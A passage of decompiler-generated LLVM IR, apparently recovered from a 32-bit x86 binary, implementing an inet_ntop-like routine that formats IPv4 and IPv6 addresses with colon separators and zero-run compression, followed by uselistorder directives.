  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8055f8d = load i32, i32* @edi, align 4
  %v0_8055f8e = load i32, i32* @esi, align 4
  %v0_8055f8f = load i32, i32* @ebx, align 4
  %v15_8055f90 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8055f97 = icmp eq i32 %arg1, 2
  br i1 %v9_8055f97, label %dec_label_pc_8055fa7, label %dec_label_pc_8055f9c

dec_label_pc_8055f9c:                             ; preds = %dec_label_pc_8055f8c
  %v9_8055f9c = icmp eq i32 %arg1, 10
  %v1_8055f9f = icmp eq i1 %v9_8055f9c, false
  br i1 %v1_8055f9f, label %dec_label_pc_8056143, label %dec_label_pc_8055fbf

dec_label_pc_8055fa7:                             ; preds = %dec_label_pc_8055f8c
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8055fb3 = call i32 @function_8055e84(i32 %v0_8055f8f, i32 %v0_8055f8e, i32 %v0_8055f8d)
  store i32 %v3_8055fb3, i32* %eax.global-to-local, align 4
  store i32 %v3_8055fb3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056150

dec_label_pc_8055fbf:                             ; preds = %dec_label_pc_8055f9c
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8055fc4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8055fc4, i32* %eax.global-to-local, align 4
  store i32 %v2_8055fc4, i32* %stack_var_-124, align 4
  %v4_8055fc9 = bitcast i32* %stack_var_-48 to i8*
  %v5_8055fc9 = call i32 @function_805143c(i8* %v4_8055fc9, i32 0, i32 32)
  store i32 %v5_8055fc9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8055feb = add i32 %arg2, 1
  br label %dec_label_pc_8055fd5

dec_label_pc_8055fd5:                             ; preds = %dec_label_pc_8055fd5.dec_label_pc_8055fd5_crit_edge, %dec_label_pc_8055fbf
  %v1_8055ff8 = phi i32 [ %v15_8055f90, %dec_label_pc_8055fbf ], [ %v1_8055ff8.pre, %dec_label_pc_8055fd5.dec_label_pc_8055fd5_crit_edge ]
  %v0_8055ff365 = phi i32 [ 0, %dec_label_pc_8055fbf ], [ %v0_8055ffc.pre, %dec_label_pc_8055fd5.dec_label_pc_8055fd5_crit_edge ]
  %v1_8055fde = ashr i32 %v0_8055ff365, 31
  %v2_8055fdf = zext i32 %v0_8055ff365 to i64
  %v4_8055fdf = zext i32 %v1_8055fde to i64
  %v5_8055fdf = mul nuw i64 %v4_8055fdf, 4294967296
  %v6_8055fdf = or i64 %v5_8055fdf, %v2_8055fdf
  %v8_8055fdf = sdiv i64 %v6_8055fdf, 2
  %v9_8055fdf = trunc i64 %v8_8055fdf to i32
  store i32 %v9_8055fdf, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8055fdf, i32* %ebx.global-to-local, align 4
  %v2_8055fe7 = add i32 %v0_8055ff365, %arg2
  %v3_8055fe7 = inttoptr i32 %v2_8055fe7 to i8*
  %v4_8055fe7 = load i8, i8* %v3_8055fe7, align 1
  %v5_8055fe7 = zext i8 %v4_8055fe7 to i32
  store i32 %v5_8055fe7, i32* %eax.global-to-local, align 4
  %v3_8055feb = add i32 %v2_8055feb, %v0_8055ff365
  %v4_8055feb = inttoptr i32 %v3_8055feb to i8*
  %v5_8055feb = load i8, i8* %v4_8055feb, align 1
  %v6_8055feb = zext i8 %v5_8055feb to i32
  store i32 %v6_8055feb, i32* %edx.global-to-local, align 4
  %v2_8055ff0 = mul nuw nsw i32 %v5_8055fe7, 256
  %v1_8055ff3 = add i32 %v0_8055ff365, 2
  store i32 %v1_8055ff3, i32* %ecx.global-to-local, align 4
  %v2_8055ff6 = or i32 %v6_8055feb, %v2_8055ff0
  store i32 %v2_8055ff6, i32* %eax.global-to-local, align 4
  %v3_8055ff8 = mul i32 %v9_8055fdf, 4
  %v4_8055ff8 = add i32 %v3_8055ff8, 60
  %v5_8055ff8 = add i32 %v4_8055ff8, %v1_8055ff8
  %v6_8055ff8 = inttoptr i32 %v5_8055ff8 to i32*
  store i32 %v2_8055ff6, i32* %v6_8055ff8, align 4
  %v0_8055ffc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8055fff = icmp sgt i32 %v0_8055ffc.pre, 15
  br i1 %v7_8055fff, label %dec_label_pc_8056001, label %dec_label_pc_8055fd5.dec_label_pc_8055fd5_crit_edge

dec_label_pc_8055fd5.dec_label_pc_8055fd5_crit_edge: ; preds = %dec_label_pc_8055fd5
  %v1_8055ff8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055fd5

dec_label_pc_8056001:                             ; preds = %dec_label_pc_8055fd5
  %v4_8055fbf = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805600b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805600b

dec_label_pc_805600b:                             ; preds = %dec_label_pc_8056001, %dec_label_pc_8056038
  %v0_805603864 = phi i32 [ 0, %dec_label_pc_8056001 ], [ %v1_8056038, %dec_label_pc_8056038 ]
  %v0_805602363 = phi i32 [ -1, %dec_label_pc_8056001 ], [ %v0_80560237, %dec_label_pc_8056038 ]
  %v0_805604362 = phi i32 [ -1, %dec_label_pc_8056001 ], [ %v0_80560288, %dec_label_pc_8056038 ]
  %v0_805604e61 = phi i32 [ -1, %dec_label_pc_8056001 ], [ %v0_805603312, %dec_label_pc_8056038 ]
  %v2_805600b = mul nuw nsw i32 %v0_805603864, 4
  %v3_805600b = add nuw nsw i32 %v2_805600b, 60
  %v4_805600b = add i32 %v3_805600b, %v0_805600b.pre
  %v5_805600b = inttoptr i32 %v4_805600b to i32*
  %v6_805600b = load i32, i32* %v5_805600b, align 4
  %v7_805600b = icmp eq i32 %v6_805600b, 0
  %v1_8056010 = icmp eq i1 %v7_805600b, false
  %v10_8056023 = icmp eq i32 %v0_805602363, -1
  br i1 %v1_8056010, label %dec_label_pc_8056023, label %dec_label_pc_8056012

dec_label_pc_8056012:                             ; preds = %dec_label_pc_805600b
  %v1_8056015 = icmp eq i1 %v10_8056023, false
  br i1 %v1_8056015, label %dec_label_pc_8056020, label %dec_label_pc_8056017

dec_label_pc_8056017:                             ; preds = %dec_label_pc_8056012
  store i32 %v0_805603864, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056038

dec_label_pc_8056020:                             ; preds = %dec_label_pc_8056012
  %v0_8056020 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056020 = add i32 %v0_8056020, 1
  store i32 %v1_8056020, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056038

dec_label_pc_8056023:                             ; preds = %dec_label_pc_805600b
  br i1 %v10_8056023, label %dec_label_pc_8056038, label %dec_label_pc_8056028

dec_label_pc_8056028:                             ; preds = %dec_label_pc_8056023
  %v10_8056028 = icmp eq i32 %v0_805604362, -1
  %v0_8056031.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805602d = load i32, i32* @ebp, align 4
  %v7_805602f = icmp sgt i32 %v0_8056031.pre, %v1_805602d
  %or.cond = or i1 %v10_8056028, %v7_805602f
  br i1 %or.cond, label %dec_label_pc_8056031, label %dec_label_pc_8056035

dec_label_pc_8056031:                             ; preds = %dec_label_pc_8056028
  store i32 %v0_8056031.pre, i32* @ebp, align 4
  store i32 %v0_805604e61, i32* @edi, align 4
  br label %dec_label_pc_8056035

dec_label_pc_8056035:                             ; preds = %dec_label_pc_8056028, %dec_label_pc_8056031
  %v0_805602810 = phi i32 [ %v0_805604e61, %dec_label_pc_8056031 ], [ %v0_805604362, %dec_label_pc_8056028 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056038

dec_label_pc_8056038:                             ; preds = %dec_label_pc_8056023, %dec_label_pc_8056020, %dec_label_pc_8056017, %dec_label_pc_8056035
  %v0_805603312 = phi i32 [ %v0_805604e61, %dec_label_pc_8056023 ], [ %v0_805604e61, %dec_label_pc_8056020 ], [ %v0_805603864, %dec_label_pc_8056017 ], [ -1, %dec_label_pc_8056035 ]
  %v0_80560237 = phi i32 [ -1, %dec_label_pc_8056023 ], [ %v0_805602363, %dec_label_pc_8056020 ], [ %v0_805603864, %dec_label_pc_8056017 ], [ -1, %dec_label_pc_8056035 ]
  %v0_80560288 = phi i32 [ %v0_805604362, %dec_label_pc_8056023 ], [ %v0_805604362, %dec_label_pc_8056020 ], [ %v0_805604362, %dec_label_pc_8056017 ], [ %v0_805602810, %dec_label_pc_8056035 ]
  %v1_8056038 = add nuw nsw i32 %v0_805603864, 1
  store i32 %v1_8056038, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8056038, 8
  br i1 %exitcond, label %dec_label_pc_805603e, label %dec_label_pc_805600b

dec_label_pc_805603e:                             ; preds = %dec_label_pc_8056038
  %v10_805603e = icmp eq i32 %v0_805603312, -1
  br i1 %v10_805603e, label %dec_label_pc_8056050, label %dec_label_pc_8056043

dec_label_pc_8056043:                             ; preds = %dec_label_pc_805603e
  %v10_8056043 = icmp eq i32 %v0_80560288, -1
  %v0_805604c.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8056043, label %dec_label_pc_805604c, label %dec_label_pc_8056048

dec_label_pc_8056048:                             ; preds = %dec_label_pc_8056043
  %v1_8056048 = load i32, i32* @ebp, align 4
  %v7_805604a = icmp sgt i32 %v0_805604c.pre, %v1_8056048
  br i1 %v7_805604a, label %dec_label_pc_805604c, label %dec_label_pc_8056050.thread

dec_label_pc_8056050.thread:                      ; preds = %dec_label_pc_8056048
  br label %dec_label_pc_8056055

dec_label_pc_805604c:                             ; preds = %dec_label_pc_8056043, %dec_label_pc_8056048
  store i32 %v0_805604c.pre, i32* @ebp, align 4
  store i32 %v0_805603312, i32* @edi, align 4
  br label %dec_label_pc_8056050

dec_label_pc_8056050:                             ; preds = %dec_label_pc_805603e, %dec_label_pc_805604c
  %v0_8056050 = phi i32 [ %v0_80560288, %dec_label_pc_805603e ], [ %v0_805603312, %dec_label_pc_805604c ]
  %v10_8056050 = icmp eq i32 %v0_8056050, -1
  br i1 %v10_8056050, label %dec_label_pc_805605d, label %dec_label_pc_8056050.dec_label_pc_8056055_crit_edge

dec_label_pc_8056050.dec_label_pc_8056055_crit_edge: ; preds = %dec_label_pc_8056050
  %v0_8056055.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8056055

dec_label_pc_8056055:                             ; preds = %dec_label_pc_8056050.dec_label_pc_8056055_crit_edge, %dec_label_pc_8056050.thread
  %v0_8056055 = phi i32 [ %v1_8056048, %dec_label_pc_8056050.thread ], [ %v0_8056055.pre, %dec_label_pc_8056050.dec_label_pc_8056055_crit_edge ]
  %v0_805605044 = phi i32 [ %v0_80560288, %dec_label_pc_8056050.thread ], [ %v0_8056050, %dec_label_pc_8056050.dec_label_pc_8056055_crit_edge ]
  %v1_8056055 = add i32 %v0_8056055, -1
  %v6_8056055 = sub i32 0, %v0_8056055
  %v7_8056055 = and i32 %v0_8056055, %v6_8056055
  %v8_8056055 = icmp slt i32 %v7_8056055, 0
  %v9_8056055 = icmp eq i32 %v1_8056055, 0
  %v10_8056055 = icmp slt i32 %v1_8056055, 0
  %v3_8056058 = icmp eq i1 %v10_8056055, %v8_8056055
  %v4_8056058 = icmp eq i1 %v9_8056055, false
  %v5_8056058 = and i1 %v4_8056058, %v3_8056058
  br i1 %v5_8056058, label %dec_label_pc_805605d, label %dec_label_pc_805605a

dec_label_pc_805605a:                             ; preds = %dec_label_pc_8056055
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805605d

dec_label_pc_805605d:                             ; preds = %dec_label_pc_8056055, %dec_label_pc_8056050, %dec_label_pc_805605a
  %v0_80560fd17 = phi i32 [ %v0_805605044, %dec_label_pc_8056055 ], [ -1, %dec_label_pc_8056050 ], [ -1, %dec_label_pc_805605a ]
  %v2_805605d = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_805605d, i32* @ebx, align 4
  %v3_80560df = add i32 %v4_8055fbf, 64
  %v12_805609d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_80560fd54 = icmp eq i32 %v0_80560fd17, -1
  %v1_80560a5 = icmp eq i1 %v12_805609d, false
  br label %dec_label_pc_8056068

dec_label_pc_8056068:                             ; preds = %dec_label_pc_805605d, %dec_label_pc_80560f3
  %v10_80560fd60 = phi i1 [ %v10_80560fd54, %dec_label_pc_805605d ], [ %v10_80560fd, %dec_label_pc_80560f3 ]
  %v0_805608259 = phi i32 [ 0, %dec_label_pc_805605d ], [ %v1_80560f3, %dec_label_pc_80560f3 ]
  %v1_805607858 = phi i32 [ %v0_80560fd17, %dec_label_pc_805605d ], [ %v0_80560fd.pre, %dec_label_pc_80560f3 ]
  %v0_805608657 = phi i32 [ %v2_805605d, %dec_label_pc_805605d ], [ %v0_805607c18, %dec_label_pc_80560f3 ]
  %stack_var_-120.156 = phi i8* [ null, %dec_label_pc_805605d ], [ %stack_var_-120.0, %dec_label_pc_80560f3 ]
  %stack_var_-116.155 = phi i32 [ 32, %dec_label_pc_805605d ], [ %stack_var_-116.0, %dec_label_pc_80560f3 ]
  br i1 %v10_80560fd60, label %dec_label_pc_8056082, label %dec_label_pc_805606d

dec_label_pc_805606d:                             ; preds = %dec_label_pc_8056068
  %v12_805606d = icmp eq i32 %v0_805608259, %v1_805607858
  %v5_805606f = icmp slt i32 %v0_805608259, %v1_805607858
  br i1 %v5_805606f, label %dec_label_pc_8056082, label %dec_label_pc_8056071

dec_label_pc_8056071:                             ; preds = %dec_label_pc_805606d
  %v1_8056071 = load i32, i32* @ebp, align 4
  %v2_8056071 = add i32 %v1_8056071, %v1_805607858
  store i32 %v2_8056071, i32* %eax.global-to-local, align 4
  %v5_8056076 = icmp slt i32 %v0_805608259, %v2_8056071
  br i1 %v5_8056076, label %dec_label_pc_8056078, label %dec_label_pc_8056082

dec_label_pc_8056078:                             ; preds = %dec_label_pc_8056071
  %v1_805607a = icmp eq i1 %v12_805606d, false
  br i1 %v1_805607a, label %dec_label_pc_80560f3, label %dec_label_pc_805607c

dec_label_pc_805607c:                             ; preds = %dec_label_pc_8056078
  %v1_805607c = inttoptr i32 %v0_805608657 to i8*
  store i8 58, i8* %v1_805607c, align 1
  %v0_805607f = load i32, i32* @ebx, align 4
  %v1_805607f = add i32 %v0_805607f, 1
  store i32 %v1_805607f, i32* @ebx, align 4
  br label %dec_label_pc_80560f3

dec_label_pc_8056082:                             ; preds = %dec_label_pc_8056071, %dec_label_pc_805606d, %dec_label_pc_8056068
  %v1_8056082 = icmp eq i32 %v0_805608259, 0
  br i1 %v1_8056082, label %dec_label_pc_805608a.thread, label %dec_label_pc_805608a

dec_label_pc_805608a.thread:                      ; preds = %dec_label_pc_8056082
  br label %dec_label_pc_80560de

dec_label_pc_805608a:                             ; preds = %dec_label_pc_8056082
  %v1_8056086 = inttoptr i32 %v0_805608657 to i8*
  store i8 58, i8* %v1_8056086, align 1
  %v0_8056089 = load i32, i32* @ebx, align 4
  %v1_8056089 = add i32 %v0_8056089, 1
  store i32 %v1_8056089, i32* @ebx, align 4
  %v0_805608a.pre = load i32, i32* @esi, align 4
  %v9_805608a = icmp eq i32 %v0_805608a.pre, 6
  %v1_805608d = icmp eq i1 %v9_805608a, false
  br i1 %v1_805608d, label %dec_label_pc_80560de, label %dec_label_pc_805608f

dec_label_pc_805608f:                             ; preds = %dec_label_pc_805608a
  %v0_805608f = load i32, i32* @edi, align 4
  %v1_805608f = icmp eq i32 %v0_805608f, 0
  %v1_8056091 = icmp eq i1 %v1_805608f, false
  br i1 %v1_8056091, label %dec_label_pc_80560de, label %dec_label_pc_8056093

dec_label_pc_8056093:                             ; preds = %dec_label_pc_805608f
  %v0_8056093 = load i32, i32* @ebp, align 4
  %v9_8056093 = icmp eq i32 %v0_8056093, 6
  br i1 %v9_8056093, label %dec_label_pc_80560a7, label %dec_label_pc_8056098

dec_label_pc_8056098:                             ; preds = %dec_label_pc_8056093
  %v9_8056098 = icmp eq i32 %v0_8056093, 5
  %v1_805609b = icmp eq i1 %v9_8056098, false
  br i1 %v1_805609b, label %dec_label_pc_80560de, label %dec_label_pc_805609d

dec_label_pc_805609d:                             ; preds = %dec_label_pc_8056098
  br i1 %v1_80560a5, label %dec_label_pc_80560de, label %dec_label_pc_80560a7

dec_label_pc_80560a7:                             ; preds = %dec_label_pc_805609d, %dec_label_pc_8056093
  %v2_80560ad = sub i32 %v1_8056089, %v2_805605d
  store i32 %v2_80560ad, i32* @esi, align 4
  %v2_80560b8 = sub i32 46, %v2_80560ad
  store i32 %v2_80560b8, i32* @ecx, align 4
  %v1_80560ba = add i32 %arg2, 12
  store i32 %v1_80560ba, i32* @eax, align 4
  store i32 %v1_8056089, i32* @edx, align 4
  %v0_80560bf = load i32, i32* %stack_var_-124, align 4
  %v2_80560bf = ptrtoint i8* %stack_var_-120.156 to i32
  %v4_80560bf = call i32 @function_8055e84(i32 %v0_80560bf, i32 %v2_80560bf, i32 %stack_var_-116.155)
  store i32 %v4_80560bf, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80560c6 = icmp eq i32 %v4_80560bf, 0
  br i1 %v1_80560c6, label %dec_label_pc_8056150, label %dec_label_pc_80560ce

dec_label_pc_80560ce:                             ; preds = %dec_label_pc_80560a7
  %v0_80560d1 = load i32, i32* @ebx, align 4
  store i32 %v0_80560d1, i32* %stack_var_-124, align 4
  %v1_80560d2 = inttoptr i32 %v0_80560d1 to i8*
  %v2_80560d2 = call i32 @function_80514b0(i8* %v1_80560d2)
  store i32 %v2_80560d2, i32* %eax.global-to-local, align 4
  %v0_80560da = load i32, i32* @ebx, align 4
  %v3_80560da = add i32 %v0_80560da, %v2_80560d2
  store i32 %v3_80560da, i32* @ebx, align 4
  %v0_8056102.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056102

dec_label_pc_80560de:                             ; preds = %dec_label_pc_805608a.thread, %dec_label_pc_805609d, %dec_label_pc_8056098, %dec_label_pc_805608f, %dec_label_pc_805608a
  %v1_80560df48 = phi i32 [ 0, %dec_label_pc_805608a.thread ], [ %v0_805608a.pre, %dec_label_pc_805609d ], [ %v0_805608a.pre, %dec_label_pc_8056098 ], [ %v0_805608a.pre, %dec_label_pc_805608f ], [ %v0_805608a.pre, %dec_label_pc_805608a ]
  %v0_80560e847 = phi i32 [ %v0_805608657, %dec_label_pc_805608a.thread ], [ %v1_8056089, %dec_label_pc_805609d ], [ %v1_8056089, %dec_label_pc_8056098 ], [ %v1_8056089, %dec_label_pc_805608f ], [ %v1_8056089, %dec_label_pc_805608a ]
  %v0_80560de = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80560de, i32* %stack_var_-112, align 4
  %v2_80560df = mul i32 %v1_80560df48, 4
  %v4_80560df = add i32 %v3_80560df, %v2_80560df
  %v5_80560df = inttoptr i32 %v4_80560df to i32*
  %v6_80560df = load i32, i32* %v5_80560df, align 4
  store i32 %v0_80560e847, i32* %stack_var_-124, align 4
  %v5_80560e9 = call i32 @function_8050570(i32 %v0_80560e847, i32 ptrtoint ([3 x i8]* @global_var_805c971.414 to i32), i32 %v6_80560df, i32 %v0_80560de)
  store i32 %v5_80560e9, i32* %eax.global-to-local, align 4
  %v0_80560f1 = load i32, i32* @ebx, align 4
  %v2_80560f1 = add i32 %v0_80560f1, %v5_80560e9
  store i32 %v2_80560f1, i32* @ebx, align 4
  br label %dec_label_pc_80560f3

dec_label_pc_80560f3:                             ; preds = %dec_label_pc_8056078, %dec_label_pc_805607c, %dec_label_pc_80560de
  %stack_var_-116.0 = phi i32 [ %v6_80560df, %dec_label_pc_80560de ], [ %stack_var_-116.155, %dec_label_pc_8056078 ], [ %stack_var_-116.155, %dec_label_pc_805607c ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805c971.414, i32 0, i32 0), %dec_label_pc_80560de ], [ %stack_var_-120.156, %dec_label_pc_8056078 ], [ %stack_var_-120.156, %dec_label_pc_805607c ]
  %v0_805607c18 = phi i32 [ %v2_80560f1, %dec_label_pc_80560de ], [ %v0_805608657, %dec_label_pc_8056078 ], [ %v1_805607f, %dec_label_pc_805607c ]
  %v0_80560f3 = load i32, i32* @esi, align 4
  %v1_80560f3 = add i32 %v0_80560f3, 1
  %v0_80560fd.pre = load i32, i32* @edi, align 4
  store i32 %v1_80560f3, i32* @esi, align 4
  %v7_80560f7 = icmp sgt i32 %v1_80560f3, 7
  %v10_80560fd = icmp eq i32 %v0_80560fd.pre, -1
  br i1 %v7_80560f7, label %dec_label_pc_80560fd, label %dec_label_pc_8056068

dec_label_pc_80560fd:                             ; preds = %dec_label_pc_80560f3
  br i1 %v10_80560fd, label %dec_label_pc_805610e, label %dec_label_pc_8056102

dec_label_pc_8056102:                             ; preds = %dec_label_pc_80560fd, %dec_label_pc_80560ce
  %v0_805610a = phi i32 [ %v0_805607c18, %dec_label_pc_80560fd ], [ %v3_80560da, %dec_label_pc_80560ce ]
  %v0_8056102 = phi i32 [ %v0_80560fd.pre, %dec_label_pc_80560fd ], [ %v0_8056102.pre, %dec_label_pc_80560ce ]
  %v1_8056102 = load i32, i32* @ebp, align 4
  %v2_8056102 = add i32 %v1_8056102, %v0_8056102
  store i32 %v2_8056102, i32* %eax.global-to-local, align 4
  %v9_8056105 = icmp eq i32 %v2_8056102, 8
  %v1_8056108 = icmp eq i1 %v9_8056105, false
  br i1 %v1_8056108, label %dec_label_pc_805610e, label %dec_label_pc_805610a

dec_label_pc_805610a:                             ; preds = %dec_label_pc_8056102
  %v1_805610a = inttoptr i32 %v0_805610a to i8*
  store i8 58, i8* %v1_805610a, align 1
  %v0_805610d = load i32, i32* @ebx, align 4
  %v1_805610d = add i32 %v0_805610d, 1
  store i32 %v1_805610d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805610e

dec_label_pc_805610e:                             ; preds = %dec_label_pc_8056102, %dec_label_pc_80560fd, %dec_label_pc_805610a
  %v0_8056112 = phi i32 [ %v0_805610a, %dec_label_pc_8056102 ], [ %v0_805607c18, %dec_label_pc_80560fd ], [ %v1_805610d, %dec_label_pc_805610a ]
  store i32 %v2_805605d, i32* %edx.global-to-local, align 4
  %v1_8056112 = add i32 %v0_8056112, 1
  store i32 %v1_8056112, i32* %eax.global-to-local, align 4
  %v1_8056115 = inttoptr i32 %v0_8056112 to i8*
  store i8 0, i8* %v1_8056115, align 1
  %v0_8056118 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056118 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056118 = sub i32 %v0_8056118, %v1_8056118
  store i32 %v2_8056118, i32* @eax, align 4
  %tmp71 = icmp ugt i32 %v2_8056118, %arg4
  br i1 %tmp71, label %dec_label_pc_8056120, label %dec_label_pc_805612d

dec_label_pc_8056120:                             ; preds = %dec_label_pc_805610e
  %v0_8056120 = load i32, i32* %stack_var_-124, align 4
  %v1_8056120 = call i32 @function_8050568(i32 %v0_8056120)
  store i32 %v1_8056120, i32* %eax.global-to-local, align 4
  %v1_8056125 = inttoptr i32 %v1_8056120 to i32*
  store i32 28, i32* %v1_8056125, align 4
  br label %dec_label_pc_805614e

dec_label_pc_805612d:                             ; preds = %dec_label_pc_805610e
  %v0_805612d = load i32, i32* @edi, align 4
  store i32 %v0_805612d, i32* %stack_var_-112, align 4
  store i32 %arg3, i32* %stack_var_-124, align 4
  %v3_8056137 = inttoptr i32 %arg3 to i8*
  %v4_8056137 = call i32 @function_8051494(i8* %v3_8056137, i32 %v2_805605d)
  store i32 %v4_8056137, i32* %eax.global-to-local, align 4
  store i32 %v4_8056137, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056150

dec_label_pc_8056143:                             ; preds = %dec_label_pc_8055f9c
  %v1_8056143 = call i32 @function_8050568(i32 %v0_8055f8f)
  store i32 %v1_8056143, i32* %eax.global-to-local, align 4
  %v1_8056148 = inttoptr i32 %v1_8056143 to i32*
  store i32 97, i32* %v1_8056148, align 4
  br label %dec_label_pc_805614e

dec_label_pc_805614e:                             ; preds = %dec_label_pc_8056120, %dec_label_pc_8056143
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056150

dec_label_pc_8056150:                             ; preds = %dec_label_pc_80560a7, %dec_label_pc_805612d, %dec_label_pc_8055fa7, %dec_label_pc_805614e
  %v0_8056153 = phi i32 [ 0, %dec_label_pc_80560a7 ], [ %v4_8056137, %dec_label_pc_805612d ], [ %v3_8055fb3, %dec_label_pc_8055fa7 ], [ 0, %dec_label_pc_805614e ]
  store i32 %v0_8056153, i32* %eax.global-to-local, align 4
  store i32 %v0_8055f8f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056153

; uselistorder directives
  uselistorder i32 %v0_8056153, { 1, 0 }
  uselistorder i32 %v0_8056112, { 1, 0 }
  uselistorder i32 %v1_80560f3, { 1, 0, 2 }
  uselistorder i32 %v0_80560e847, { 1, 0 }
  uselistorder i32 %v0_805608a.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8056089, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.155, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.156, { 2, 1, 0 }
  uselistorder i32 %v0_805608657, { 2, 3, 1, 0 }
  uselistorder i32 %v1_805607858, { 2, 0, 1 }
  uselistorder i32 %v0_805608259, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805605d, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8056055, { 1, 0 }
  uselistorder i32 %v0_8056055, { 1, 2, 0 }
  uselistorder i32 %v1_8056038, { 0, 2, 1 }
  uselistorder i32 %v0_80560288, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805603312, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8056023, { 1, 0 }
  uselistorder i32 %v0_805604e61, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805604362, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805603864, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8055ff365, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8055f8f, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-124, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 2, 6, 1, 0, 3, 4, 5 }
  uselistorder [3 x i8]* @global_var_805c971.414, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 6, 3, 0, 5, 7, 2, 4, 1 }
  uselistorder i32* @esp, { 0, 1, 20, 21, 22, 23, 24, 25, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 10, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 6, 124, 125, 126, 7, 127, 4, 128, 129, 130, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 5, 147, 148, 149, 150, 151, 152, 9, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 57, 174, 2, 3, 11, 58, 59, 60, 61, 12, 62, 63, 64, 65, 66, 14, 67, 68, 69, 16, 70, 17, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 15, 83, 18, 84, 85, 86, 19, 87, 88, 89, 90, 91, 92, 93, 94, 13, 95, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 96, 97, 98, 99, 100, 101, 102 }
  uselistorder i32 15, { 1, 3, 6, 5, 2, 4, 0 }
  uselistorder i32 60, { 5, 6, 3, 8, 9, 4, 1, 2, 7, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32 (i8*, i32, i32)* @function_805143c, { 0, 10, 11, 12, 3, 14, 15, 7, 13, 4, 1, 2, 5, 6, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @function_8055e84, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8056150, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805614e, { 1, 0 }
  uselistorder label %dec_label_pc_805610e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80560f3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80560de, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056068, { 1, 0 }
